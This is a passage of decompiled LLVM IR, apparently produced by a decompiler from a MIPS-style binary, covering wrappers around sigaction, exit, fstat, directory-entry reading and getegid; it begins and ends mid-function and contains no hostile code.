  uselistorder i32* @global_var_449580.238, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_406b98, { 1, 0 }
  uselistorder label %dec_label_pc_406b70, { 1, 0 }
  uselistorder label %dec_label_pc_406b04, { 1, 0 }
  uselistorder label %dec_label_pc_406a90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406994, { 1, 0 }
  uselistorder label %dec_label_pc_406944, { 1, 0 }
  uselistorder label %dec_label_pc_4068e0, { 1, 0 }
}

define i32 @function_406bd0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406bd0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp8 = alloca i32, align 4
  store i32 %tmp, i32* %s0.global-to-local, align 4
  store i32 %arg3, i32* %s1.global-to-local, align 4
  store i32 %arg1, i32* %s2.global-to-local, align 4
  %v1_406c0c = icmp eq i32* %arg2, null
  br i1 %v1_406c0c, label %dec_label_pc_406c3c, label %dec_label_pc_406c10

dec_label_pc_406c10:                              ; preds = %dec_label_pc_406bd0
  %v3_406c00 = load i32, i32* @global_var_449398.370, align 4
  call void @__pseudo_call(i32 %v3_406c00)
  %v0_406c20 = load i32, i32* %s0.global-to-local, align 4
  %v1_406c20 = add i32 %v0_406c20, 136
  %v2_406c20 = inttoptr i32 %v1_406c20 to i32*
  %v3_406c20 = load i32, i32* %v2_406c20, align 4
  store i32 %v3_406c20, i32* @v1, align 4
  %v1_406c24 = inttoptr i32 %v0_406c20 to i32*
  %v2_406c24 = load i32, i32* %v1_406c24, align 4
  store i32 %v2_406c24, i32* @v0, align 4
  %v0_406c50.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_406c3c

dec_label_pc_406c3c:                              ; preds = %dec_label_pc_406bd0, %dec_label_pc_406c10
  %v0_406c50 = phi i32 [ %arg1, %dec_label_pc_406bd0 ], [ %v0_406c50.pre, %dec_label_pc_406c10 ]
  %v3_406c4c = load i32, i32* @global_var_449350.387, align 4
  store i32 %v0_406c50, i32* @a0, align 4
  call void @__pseudo_call(i32 %v3_406c4c)
  %v0_406c60 = load i32, i32* %s1.global-to-local, align 4
  %v1_406c60 = icmp eq i32 %v0_406c60, 0
  %v2_406c60 = load i32, i32* @v0, align 4
  store i32 %v2_406c60, i32* %s0.global-to-local, align 4
  br i1 %v1_406c60, label %dec_label_pc_406c9c, label %dec_label_pc_406c64

dec_label_pc_406c64:                              ; preds = %dec_label_pc_406c3c
  %v3_406c68 = load i32, i32* @global_var_449398.370, align 4
  %v1_406c6c = add i32 %v0_406c60, 8
  store i32 %v1_406c6c, i32* @a0, align 4
  %v1_406c74 = icmp slt i32 %v2_406c60, 0
  br i1 %v1_406c74, label %dec_label_pc_406c9c, label %dec_label_pc_406c78

dec_label_pc_406c78:                              ; preds = %dec_label_pc_406c64
  call void @__pseudo_call(i32 %v3_406c68)
  %v3_406c8c = load i32, i32* %tmp8, align 4
  %v1_406c94 = load i32, i32* %s1.global-to-local, align 4
  %v2_406c94 = inttoptr i32 %v1_406c94 to i32*
  store i32 %v3_406c8c, i32* %v2_406c94, align 4
  %v0_406c98 = load i32, i32* @v1, align 4
  %v1_406c98 = load i32, i32* %s1.global-to-local, align 4
  %v2_406c98 = add i32 %v1_406c98, 136
  %v3_406c98 = inttoptr i32 %v2_406c98 to i32*
  store i32 %v0_406c98, i32* %v3_406c98, align 4
  %v0_406c9c.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406c9c

dec_label_pc_406c9c:                              ; preds = %dec_label_pc_406c64, %dec_label_pc_406c3c, %dec_label_pc_406c78
  %v0_406c9c = phi i32 [ %v2_406c60, %dec_label_pc_406c64 ], [ %v2_406c60, %dec_label_pc_406c3c ], [ %v0_406c9c.pre, %dec_label_pc_406c78 ]
  ret i32 %v0_406c9c

; uselistorder directives
  uselistorder label %dec_label_pc_406c9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406c3c, { 1, 0 }
}

define i32 @function_406cc0(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_406cc0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %sigaction*
  %v7_406ce0 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp)
  %v3_406ce4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_406ce4, i32* @t9, align 4
  %v1_406ce8 = icmp eq i32 %arg4, 0
  store i32 %v7_406ce0, i32* %s0.global-to-local, align 4
  br i1 %v1_406ce8, label %dec_label_pc_406d04, label %dec_label_pc_406cec

dec_label_pc_406cec:                              ; preds = %dec_label_pc_406cc0
  %v1_406cf0 = call i32 @function_405490()
  %v0_406cfc = load i32, i32* %s0.global-to-local, align 4
  %v2_406cfc = inttoptr i32 %v1_406cf0 to i32*
  store i32 %v0_406cfc, i32* %v2_406cfc, align 4
  br label %dec_label_pc_406d04

dec_label_pc_406d04:                              ; preds = %dec_label_pc_406cc0, %dec_label_pc_406cec
  %v4_406d0c = phi i32 [ %v7_406ce0, %dec_label_pc_406cc0 ], [ -1, %dec_label_pc_406cec ]
  ret i32 %v4_406d0c

; uselistorder directives
  uselistorder label %dec_label_pc_406d04, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_406d20(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_406d20:
  store i32 %arg1, i32* @s1, align 4
  call void @exit(i32 %arg1)
  unreachable

; uselistorder directives
  uselistorder i32* @s1, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
}

define i32 @function_406d70(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406d70:
  %s0.global-to-local = alloca i32, align 4
  %tmp4 = alloca i32, align 4
  %tmp5 = bitcast i32* %tmp4 to %stat*
  %v4_406da0 = call i32 @fstat(i32 %arg1, %stat* %tmp5)
  %v3_406da4 = load i32, i32* @global_var_4492e0.256, align 4
  %v0_406da8 = load i32, i32* @a3, align 4
  %v1_406da8 = icmp eq i32 %v0_406da8, 0
  store i32 %v4_406da0, i32* %s0.global-to-local, align 4
  br i1 %v1_406da8, label %dec_label_pc_406dc8, label %dec_label_pc_406dac

dec_label_pc_406dac:                              ; preds = %dec_label_pc_406d70
  call void @__pseudo_call(i32 %v3_406da4)
  %v0_406dbc = load i32, i32* %s0.global-to-local, align 4
  %v2_406dbc = inttoptr i32 %v4_406da0 to i32*
  store i32 %v0_406dbc, i32* %v2_406dbc, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406dc8

dec_label_pc_406dc8:                              ; preds = %dec_label_pc_406d70, %dec_label_pc_406dac
  %v0_406de42 = phi i32 [ %v4_406da0, %dec_label_pc_406d70 ], [ -1, %dec_label_pc_406dac ]
  %v1_406dd0 = icmp eq i32 %v4_406da0, 0
  br i1 %v1_406dd0, label %dec_label_pc_406dd4, label %dec_label_pc_406de4

dec_label_pc_406dd4:                              ; preds = %dec_label_pc_406dc8
  %v3_406dc8 = load i32, i32* @global_var_44934c.391, align 4
  call void @__pseudo_call(i32 %v3_406dc8)
  %v0_406de4.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406de4

dec_label_pc_406de4:                              ; preds = %dec_label_pc_406dc8, %dec_label_pc_406dd4
  %v0_406de4 = phi i32 [ %v0_406de42, %dec_label_pc_406dc8 ], [ %v0_406de4.pre, %dec_label_pc_406dd4 ]
  ret i32 %v0_406de4

; uselistorder directives
  uselistorder i32 %v4_406da0, { 1, 0, 3, 2 }
  uselistorder i32* %s0.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_406de4, { 1, 0 }
  uselistorder label %dec_label_pc_406dc8, { 1, 0 }
}

define i32 @function_406e00(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406e00:
  %a2.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @a1, align 4
  %v0_406e10 = load i32, i32* @ra, align 4
  %v3_406e24 = load i32, i32* @global_var_4492c0.393, align 4
  store i32 %v3_406e24, i32* @t9, align 4
  store i32 %tmp, i32* @s0, align 4
  %v2_406e2c = call i32 @function_406ed0()
  store i32 %v2_406e2c, i32* %v0.global-to-local, align 4
  %v1_406e38 = icmp slt i32 %v2_406e2c, 1
  store i32 %v2_406e2c, i32* %s1.global-to-local, align 4
  br i1 %v1_406e38, label %dec_label_pc_406eac, label %dec_label_pc_406e3c

dec_label_pc_406e3c:                              ; preds = %dec_label_pc_406e00
  %v0_406e44 = load i32, i32* @s0, align 4
  %v2_406e44 = add i32 %v0_406e44, %v2_406e2c
  store i32 %v2_406e44, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_406e48

dec_label_pc_406e48:                              ; preds = %dec_label_pc_406e48, %dec_label_pc_406e3c
  %v1_406e5c = phi i32 [ %v2_406e94, %dec_label_pc_406e48 ], [ %v0_406e44, %dec_label_pc_406e3c ]
  %v1_406e48 = add i32 %v1_406e5c, 16
  %v2_406e48 = inttoptr i32 %v1_406e48 to i16*
  %v3_406e48 = load i16, i16* %v2_406e48, align 2
  %v4_406e48 = zext i16 %v3_406e48 to i32
  store i32 %v4_406e48, i32* %v0.global-to-local, align 4
  %v1_406e4c = add i32 %v1_406e5c, 4
  %v2_406e4c = inttoptr i32 %v1_406e4c to i32*
  %v3_406e4c = load i32, i32* %v2_406e4c, align 4
  %v1_406e50 = add i32 %v1_406e5c, 12
  %v2_406e50 = inttoptr i32 %v1_406e50 to i32*
  %v3_406e50 = load i32, i32* %v2_406e50, align 4
  store i32 %v3_406e50, i32* @a3, align 4
  %v1_406e54 = add i32 %v1_406e5c, 18
  %v2_406e54 = inttoptr i32 %v1_406e54 to i8*
  %v3_406e54 = load i8, i8* %v2_406e54, align 1
  %v4_406e54 = zext i8 %v3_406e54 to i32
  store i32 %v4_406e54, i32* %t0.global-to-local, align 4
  store i32 %v4_406e48, i32* %a2.global-to-local, align 4
  %v2_406e5c = inttoptr i32 %v1_406e5c to i32*
  store i32 %v3_406e4c, i32* %v2_406e5c, align 4
  %v0_406e60 = load i32, i32* @a3, align 4
  %v1_406e60 = load i32, i32* @s0, align 4
  %v2_406e60 = add i32 %v1_406e60, 4
  %v3_406e60 = inttoptr i32 %v2_406e60 to i32*
  store i32 %v0_406e60, i32* %v3_406e60, align 4
  %v0_406e64 = load i32, i32* %t0.global-to-local, align 4
  %v1_406e64 = trunc i32 %v0_406e64 to i8
  %v2_406e64 = load i32, i32* @s0, align 4
  %v3_406e64 = add i32 %v2_406e64, 10
  %v4_406e64 = inttoptr i32 %v3_406e64 to i8*
  store i8 %v1_406e64, i8* %v4_406e64, align 1
  %v0_406e68 = load i32, i32* %v0.global-to-local, align 4
  %v1_406e68 = trunc i32 %v0_406e68 to i16
  %v2_406e68 = load i32, i32* @s0, align 4
  %v3_406e68 = add i32 %v2_406e68, 8
  %v4_406e68 = inttoptr i32 %v3_406e68 to i16*
  store i16 %v1_406e68, i16* %v4_406e68, align 2
  %v0_406e6c = load i32, i32* @t9, align 4
  %v1_406e6c = load i32, i32* %a2.global-to-local, align 4
  %v2_406e6c = add i32 %v1_406e6c, -19
  store i32 %v2_406e6c, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_406e6c)
  %v0_406e78 = load i32, i32* @s0, align 4
  %v1_406e78 = add i32 %v0_406e78, 8
  %v2_406e78 = inttoptr i32 %v1_406e78 to i16*
  %v3_406e78 = load i16, i16* %v2_406e78, align 2
  %v4_406e78 = zext i16 %v3_406e78 to i32
  store i32 %v4_406e78, i32* %a2.global-to-local, align 4
  %v3_406e7c = load i32, i32* @global_var_4493b0.395, align 4
  store i32 %v3_406e7c, i32* @t9, align 4
  %v5_406e84 = call i32 @function_407840(i32 %v0_406e78, i32 %v0_406e78, i32 %v4_406e78)
  store i32 %v5_406e84, i32* %v0.global-to-local, align 4
  %v0_406e8c = load i32, i32* @s0, align 4
  %v1_406e8c = add i32 %v0_406e8c, 8
  %v2_406e8c = inttoptr i32 %v1_406e8c to i16*
  %v3_406e8c = load i16, i16* %v2_406e8c, align 2
  %v4_406e8c = zext i16 %v3_406e8c to i32
  %v2_406e94 = add i32 %v4_406e8c, %v0_406e8c
  store i32 %v2_406e94, i32* @s0, align 4
  %v1_406e98 = load i32, i32* %s2.global-to-local, align 4
  %v2_406e98 = icmp ult i32 %v2_406e94, %v1_406e98
  %v3_406e98 = zext i1 %v2_406e98 to i32
  store i32 %v3_406e98, i32* %v0.global-to-local, align 4
  %v3_406e9c = load i32, i32* @global_var_4493b0.395, align 4
  store i32 %v3_406e9c, i32* @t9, align 4
  br i1 %v2_406e98, label %dec_label_pc_406e48, label %dec_label_pc_406eac.loopexit

dec_label_pc_406eac.loopexit:                     ; preds = %dec_label_pc_406e48
  %v0_406eac.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_406eac

dec_label_pc_406eac:                              ; preds = %dec_label_pc_406eac.loopexit, %dec_label_pc_406e00
  %v0_406eac = phi i32 [ %v0_406eac.pre, %dec_label_pc_406eac.loopexit ], [ %v2_406e2c, %dec_label_pc_406e00 ]
  store i32 %v0_406eac, i32* %v0.global-to-local, align 4
  store i32 %v0_406e10, i32* @ra, align 4
  ret i32 %v0_406eac

; uselistorder directives
  uselistorder i32 %v0_406eac, { 1, 0 }
  uselistorder i32 %v2_406e94, { 1, 2, 0 }
  uselistorder i32 %v0_406e78, { 1, 0, 2 }
  uselistorder i32 %v1_406e5c, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_406e44, { 1, 0 }
  uselistorder i32 %v2_406e2c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 4, 2, 3, 5 }
}

define i32 @function_406ed0() local_unnamed_addr {
dec_label_pc_406ed0:
  %a2.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v1_406ed8 = load i32, i32* @t9, align 4
  %v2_406ed8 = add i32 %v1_406ed8, 303872
  store i32 %v2_406ed8, i32* %gp.global-to-local, align 4
  %v2_406edc = ptrtoint i32* %stack_var_-72 to i32
  %v0_406f10 = load i32, i32* @a2, align 4
  %v1_406f10 = add i32 %v0_406f10, 14
  %v1_406f14 = and i32 %v1_406f10, -8
  %v2_406f1c = sub i32 %v2_406edc, %v1_406f14
  %v1_406f20 = add i32 %v2_406f1c, 24
  store i32 %v1_406f20, i32* %s3.global-to-local, align 4
  %v0_406f24 = load i32, i32* @a1, align 4
  store i32 %v0_406f24, i32* %s4.global-to-local, align 4
  store i32 %v0_406f10, i32* %s5.global-to-local, align 4
  store i32 4219, i32* %v0.global-to-local, align 4
  %v0_406f3c = load i32, i32* @a3, align 4
  %v1_406f3c = icmp eq i32 %v0_406f3c, 0
  store i32 4219, i32* %s2.global-to-local, align 4
  br i1 %v1_406f3c, label %dec_label_pc_406f60, label %dec_label_pc_406f68

dec_label_pc_406f60:                              ; preds = %dec_label_pc_406ed0
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v0_406f24, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_406f74

dec_label_pc_406f68:                              ; preds = %dec_label_pc_406ed0
  %v3_406f44 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_406f44, i32* @t9, align 4
  %v1_406f4c = call i32 @function_405490()
  store i32 %v2_406ed8, i32* %gp.global-to-local, align 4
  %v0_406f58 = load i32, i32* %s2.global-to-local, align 4
  %v2_406f58 = inttoptr i32 %v1_406f4c to i32*
  store i32 %v0_406f58, i32* %v2_406f58, align 4
  store i32 -1, i32* %s2.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v3_406f642 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_406f642, i32* %s1.global-to-local, align 4
  %v0_406f74.pre = load i32, i32* %s3.global-to-local, align 4
  %v0_406f98.pre.pre = load i32, i32* @a3, align 4
  br label %dec_label_pc_406f74

dec_label_pc_406f74:                              ; preds = %dec_label_pc_406f60, %dec_label_pc_406f68
  %v0_406f98.pre = phi i32 [ 0, %dec_label_pc_406f60 ], [ %v0_406f98.pre.pre, %dec_label_pc_406f68 ]
  %v0_406f946 = phi i32 [ %v0_406f24, %dec_label_pc_406f60 ], [ %v3_406f642, %dec_label_pc_406f68 ]
  %v0_406f74 = phi i32 [ %v1_406f20, %dec_label_pc_406f60 ], [ %v0_406f74.pre, %dec_label_pc_406f68 ]
  store i32 %v0_406f74, i32* %s0.global-to-local, align 4
  store i32 -1, i32* %s7.global-to-local, align 4
  store i32 -1, i32* %s6.global-to-local, align 4
  br label %dec_label_pc_406f84

dec_label_pc_406f84:                              ; preds = %dec_label_pc_406fe8.dec_label_pc_406f84_crit_edge, %dec_label_pc_406f74
  %v2_406f9c = phi i32 [ %v2_406f9c.pre, %dec_label_pc_406fe8.dec_label_pc_406f84_crit_edge ], [ -1, %dec_label_pc_406f74 ]
  %v0_406f98 = phi i32 [ %v4_407050, %dec_label_pc_406fe8.dec_label_pc_406f84_crit_edge ], [ %v0_406f98.pre, %dec_label_pc_406f74 ]
  %v0_406f94 = phi i32 [ %v0_407048, %dec_label_pc_406fe8.dec_label_pc_406f84_crit_edge ], [ %v0_406f946, %dec_label_pc_406f74 ]
  %v0_406f84 = phi i32 [ %v2_407038, %dec_label_pc_406fe8.dec_label_pc_406f84_crit_edge ], [ %v0_406f74, %dec_label_pc_406f74 ]
  %v1_406f84 = add i32 %v0_406f84, 16
  %v2_406f84 = inttoptr i32 %v1_406f84 to i16*
  %v3_406f84 = load i16, i16* %v2_406f84, align 2
  %v4_406f84 = zext i16 %v3_406f84 to i32
  store i32 -8, i32* %v1.global-to-local, align 4
  %v1_406f8c = add nuw nsw i32 %v4_406f84, 7
  %v2_406f90 = and i32 %v1_406f8c, 131064
  store i32 %v2_406f90, i32* %a2.global-to-local, align 4
  %v2_406f94 = add i32 %v2_406f90, %v0_406f94
  store i32 %v2_406f94, i32* %t0.global-to-local, align 4
  %v2_406f98 = icmp ult i32 %v0_406f98, %v2_406f94
  %v3_406f98 = zext i1 %v2_406f98 to i32
  store i32 %v3_406f98, i32* %v0.global-to-local, align 4
  %v1_406f9c = icmp eq i1 %v2_406f98, false
  store i32 %v2_406f9c, i32* @a3, align 4
  br i1 %v1_406f9c, label %dec_label_pc_406fe8, label %dec_label_pc_406fa0

dec_label_pc_406fa0:                              ; preds = %dec_label_pc_406f84
  %v0_406fa4 = load i32, i32* %gp.global-to-local, align 4
  %v1_406fa4 = add i32 %v0_406fa4, -32084
  %v2_406fa4 = inttoptr i32 %v1_406fa4 to i32*
  %v3_406fa4 = load i32, i32* %v2_406fa4, align 4
  store i32 %v3_406fa4, i32* @t9, align 4
  %v0_406fac = load i32, i32* @sp, align 4
  %v1_406fac = add i32 %v0_406fac, 16
  %v2_406fac = inttoptr i32 %v1_406fac to i32*
  store i32 0, i32* %v2_406fac, align 4
  %v1_406fb0 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_406fb0, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406fa4)
  store i32 %v2_406ed8, i32* %gp.global-to-local, align 4
  %v0_406fbc = load i32, i32* %s1.global-to-local, align 4
  %v1_406fbc = load i32, i32* %s4.global-to-local, align 4
  %v2_406fbc = icmp eq i32 %v0_406fbc, %v1_406fbc
  br i1 %v2_406fbc, label %dec_label_pc_406fc0, label %dec_label_pc_407058

dec_label_pc_406fc0:                              ; preds = %dec_label_pc_406fa0
  %v3_406fc4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_406fc4, i32* @t9, align 4
  %v1_406fcc = call i32 @function_405490()
  store i32 %v1_406fcc, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed8, i32* %gp.global-to-local, align 4
  store i32 22, i32* %v1.global-to-local, align 4
  %v2_406fe4 = inttoptr i32 %v1_406fcc to i32*
  store i32 22, i32* %v2_406fe4, align 4
  %v0_406fe8.pre = load i32, i32* %s0.global-to-local, align 4
  %v1_406ff8.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_406fe8

dec_label_pc_406fe8:                              ; preds = %dec_label_pc_406f84, %dec_label_pc_406fc0
  %v1_406ff8 = phi i32 [ %v0_406f94, %dec_label_pc_406f84 ], [ %v1_406ff8.pre, %dec_label_pc_406fc0 ]
  %v0_406ff0 = phi i32 [ %v0_406f84, %dec_label_pc_406f84 ], [ %v0_406fe8.pre, %dec_label_pc_406fc0 ]
  %v1_406fe8 = add i32 %v0_406ff0, 4
  %v2_406fe8 = inttoptr i32 %v1_406fe8 to i32*
  %v3_406fe8 = load i32, i32* %v2_406fe8, align 4
  store i32 %v3_406fe8, i32* %v1.global-to-local, align 4
  %v1_406fec = inttoptr i32 %v0_406ff0 to i32*
  %v2_406fec = load i32, i32* %v1_406fec, align 4
  store i32 %v2_406fec, i32* %v0.global-to-local, align 4
  %v1_406ff0 = add i32 %v0_406ff0, 12
  %v2_406ff0 = inttoptr i32 %v1_406ff0 to i32*
  %v3_406ff0 = load i32, i32* %v2_406ff0, align 4
  store i32 %v3_406ff0, i32* %s7.global-to-local, align 4
  %v1_406ff4 = add i32 %v0_406ff0, 8
  %v2_406ff4 = inttoptr i32 %v1_406ff4 to i32*
  %v3_406ff4 = load i32, i32* %v2_406ff4, align 4
  store i32 %v3_406ff4, i32* %s6.global-to-local, align 4
  %v2_406ff8 = add i32 %v1_406ff8, 4
  %v3_406ff8 = inttoptr i32 %v2_406ff8 to i32*
  store i32 %v3_406fe8, i32* %v3_406ff8, align 4
  %v0_406ffc = load i32, i32* %v0.global-to-local, align 4
  %v1_406ffc = load i32, i32* %s1.global-to-local, align 4
  %v2_406ffc = inttoptr i32 %v1_406ffc to i32*
  store i32 %v0_406ffc, i32* %v2_406ffc, align 4
  %v0_407000 = load i32, i32* %s0.global-to-local, align 4
  %v1_407000 = add i32 %v0_407000, 8
  %v2_407000 = inttoptr i32 %v1_407000 to i32*
  %v3_407000 = load i32, i32* %v2_407000, align 4
  store i32 %v3_407000, i32* %v0.global-to-local, align 4
  %v1_407004 = add i32 %v0_407000, 12
  %v2_407004 = inttoptr i32 %v1_407004 to i32*
  %v3_407004 = load i32, i32* %v2_407004, align 4
  store i32 %v3_407004, i32* %v1.global-to-local, align 4
  %v0_407008 = load i32, i32* %a2.global-to-local, align 4
  %v1_407008 = trunc i32 %v0_407008 to i16
  %v2_407008 = load i32, i32* %s1.global-to-local, align 4
  %v3_407008 = add i32 %v2_407008, 16
  %v4_407008 = inttoptr i32 %v3_407008 to i16*
  store i16 %v1_407008, i16* %v4_407008, align 2
  %v0_40700c = load i32, i32* %v1.global-to-local, align 4
  %v1_40700c = load i32, i32* %s1.global-to-local, align 4
  %v2_40700c = add i32 %v1_40700c, 12
  %v3_40700c = inttoptr i32 %v2_40700c to i32*
  store i32 %v0_40700c, i32* %v3_40700c, align 4
  %v0_407010 = load i32, i32* %v0.global-to-local, align 4
  %v1_407010 = load i32, i32* %s1.global-to-local, align 4
  %v2_407010 = add i32 %v1_407010, 8
  %v3_407010 = inttoptr i32 %v2_407010 to i32*
  store i32 %v0_407010, i32* %v3_407010, align 4
  %v0_407014 = load i32, i32* %s0.global-to-local, align 4
  %v1_407014 = add i32 %v0_407014, 18
  %v2_407014 = inttoptr i32 %v1_407014 to i8*
  %v3_407014 = load i8, i8* %v2_407014, align 1
  %v4_407014 = zext i8 %v3_407014 to i32
  store i32 %v4_407014, i32* %v0.global-to-local, align 4
  %v2_40701c = load i32, i32* %s1.global-to-local, align 4
  %v3_40701c = add i32 %v2_40701c, 18
  %v4_40701c = inttoptr i32 %v3_40701c to i8*
  store i8 %v3_407014, i8* %v4_40701c, align 1
  %v0_407020 = load i32, i32* %s0.global-to-local, align 4
  %v1_407020 = add i32 %v0_407020, 16
  %v2_407020 = inttoptr i32 %v1_407020 to i16*
  %v3_407020 = load i16, i16* %v2_407020, align 2
  %v4_407020 = zext i16 %v3_407020 to i32
  %v0_407024 = load i32, i32* %t0.global-to-local, align 4
  store i32 %v0_407024, i32* %s1.global-to-local, align 4
  %v0_407028 = load i32, i32* @t9, align 4
  %v2_407028 = add nsw i32 %v4_407020, -19
  store i32 %v2_407028, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_407028)
  %v0_407030 = load i32, i32* %s0.global-to-local, align 4
  %v1_407030 = add i32 %v0_407030, 16
  %v2_407030 = inttoptr i32 %v1_407030 to i16*
  %v3_407030 = load i16, i16* %v2_407030, align 2
  %v4_407030 = zext i16 %v3_407030 to i32
  store i32 %v2_406ed8, i32* %gp.global-to-local, align 4
  %v2_407038 = add i32 %v4_407030, %v0_407030
  store i32 %v2_407038, i32* %s0.global-to-local, align 4
  %v0_40703c = load i32, i32* %s3.global-to-local, align 4
  %v1_40703c = load i32, i32* %s2.global-to-local, align 4
  %v2_40703c = add i32 %v1_40703c, %v0_40703c
  %v2_407040 = icmp ult i32 %v2_407038, %v2_40703c
  %v3_407040 = zext i1 %v2_407040 to i32
  store i32 %v3_407040, i32* %v0.global-to-local, align 4
  %v3_407044 = load i32, i32* @global_var_449398.370, align 4
  store i32 %v3_407044, i32* @t9, align 4
  %v0_407048 = load i32, i32* %s1.global-to-local, align 4
  %v1_407050 = icmp eq i1 %v2_407040, false
  %v2_407050 = load i32, i32* %s4.global-to-local, align 4
  %v3_407050 = load i32, i32* %s5.global-to-local, align 4
  %v4_407050 = add i32 %v3_407050, %v2_407050
  store i32 %v4_407050, i32* @a3, align 4
  br i1 %v1_407050, label %dec_label_pc_407058, label %dec_label_pc_406fe8.dec_label_pc_406f84_crit_edge

dec_label_pc_406fe8.dec_label_pc_406f84_crit_edge: ; preds = %dec_label_pc_406fe8
  %v2_406f9c.pre = load i32, i32* %s7.global-to-local, align 4
  br label %dec_label_pc_406f84

dec_label_pc_407058:                              ; preds = %dec_label_pc_406fe8, %dec_label_pc_406fa0
  %v1_407058 = phi i32 [ %v2_407050, %dec_label_pc_406fe8 ], [ %v1_406fbc, %dec_label_pc_406fa0 ]
  %v0_407058 = phi i32 [ %v0_407048, %dec_label_pc_406fe8 ], [ %v0_406fbc, %dec_label_pc_406fa0 ]
  %v2_407058 = sub i32 %v0_407058, %v1_407058
  store i32 %v2_407058, i32* %v0.global-to-local, align 4
  ret i32 %v2_407058

; uselistorder directives
  uselistorder i32 %v2_407058, { 1, 0 }
  uselistorder i32 %v4_407050, { 1, 0 }
  uselistorder i32 %v2_407050, { 1, 0 }
  uselistorder i32 %v2_407038, { 1, 2, 0 }
  uselistorder i32 %v0_406ff0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_406f94, { 1, 0 }
  uselistorder i32 %v2_406ed8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 11, 8, 10 }
  uselistorder i32* %s2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 2 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %a2.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 -19, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 18, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 0, 10 }
  uselistorder i32 7, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 14, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_406fe8, { 1, 0 }
  uselistorder label %dec_label_pc_406f74, { 1, 0 }
}

define i32 @function_4070a0() local_unnamed_addr {
dec_label_pc_4070a0:
  %s0.global-to-local = alloca i32, align 4
  %v0_4070c0 = call i32 @getegid()
  %v3_4070c4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4070c4, i32* @t9, align 4
  %v0_4070c8 = load i32, i32* @a3, align 4
  %v1_4070c8 = icmp eq i32 %v0_4070c8, 0
  store i32 %v0_4070c0, i32* %s0.global-to-local, align 4
  br i1 %v1_4070c8, label %dec_label_pc_4070e4, label %dec_label_pc_4070cc

dec_label_pc_4070cc:                              ; preds = %dec_label_pc_4070a0
  %v1_4070d0 = call i32 @function_405490()
  %v0_4070dc = load i32, i32* %s0.global-to-local, align 4
  %v2_4070dc = inttoptr i32 %v1_4070d0 to i32*
  store i32 %v0_4070dc, i32* %v2_4070dc, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
